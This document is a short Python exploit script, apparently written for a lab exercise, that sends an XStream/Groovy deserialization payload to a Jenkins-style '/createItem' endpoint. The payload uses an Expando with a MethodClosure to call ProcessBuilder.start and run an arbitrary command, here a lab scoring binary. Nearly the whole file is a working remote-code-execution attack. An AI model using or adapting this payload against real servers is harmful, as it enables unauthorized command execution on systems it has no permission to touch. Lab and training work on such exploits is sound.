import requests

def prepare_payload(command):
    split_command = command.split()
    prepared_commands = ''.join(f'<string>{entry}</string>' for entry in split_command)

    xml = f'''
    <map>
      <entry>
        <groovy.util.Expando>
          <expandoProperties>
            <entry>
              <string>hashCode</string>
              <org.codehaus.groovy.runtime.MethodClosure>
                <delegate class="groovy.util.Expando"/>
                <owner class="java.lang.ProcessBuilder">
                  <command>{prepared_commands}</command>
                </owner>
                <method>start</method>
              </org.codehaus.groovy.runtime.MethodClosure>
            </entry>
          </expandoProperties>
        </groovy.util.Expando>
        <int>1</int>
      </entry>
    </map>'''
    return xml

def exploit(url, command):
    payload = prepare_payload(command)
    headers = {'Content-Type': 'application/xml'}
    random_job_name = 'abc123xy'  # Replace with a random 8-character string
    post_url = f'{url.rstrip("/")}/createItem?name={random_job_name}'

    response = requests.post(post_url, data=payload, headers=headers)
    if response.status_code == 500:
        print("Exploit successful!")
    else:
        print(f"Exploit failed. Status code: {response.status_code}")

if __name__ == '__main__':
    url = 'https://ptl-402e035b-a3614464.libcurl.so'
    command = '/usr/local/bin/score 9a7cac22-241d-4040-90dc-81641637f291'
    exploit(url, command)
